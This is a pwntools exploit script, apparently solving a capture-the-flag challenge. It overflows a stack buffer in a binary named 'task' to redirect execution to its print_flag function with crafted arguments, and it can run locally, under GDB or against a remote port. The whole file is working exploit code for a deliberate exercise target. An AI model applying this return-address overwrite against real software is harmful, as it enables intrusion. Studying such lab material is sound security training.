from pwn import *

elf = ELF('./task')

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *main",
		"b *vuln+69",
		"c"
	]))
elif args.REMOTE:
	p = remote("localhost" if not args.ADDR else args.ADDR, 11304)
else:
	p = process(elf.path) 

# print_flag expects following stack layout
# |  retaddr
# |  param 1
# v  param 2

payload = b'A' * 0x2c
payload += p32(elf.symbols['print_flag'])
payload += b'C' * 4 # filler, fake retaddr
payload += p32(-1337, sign='signed')
payload += p32(0xC0FFEE)
print(payload)

p.sendline(payload)

data = p.recvall()
print(data)
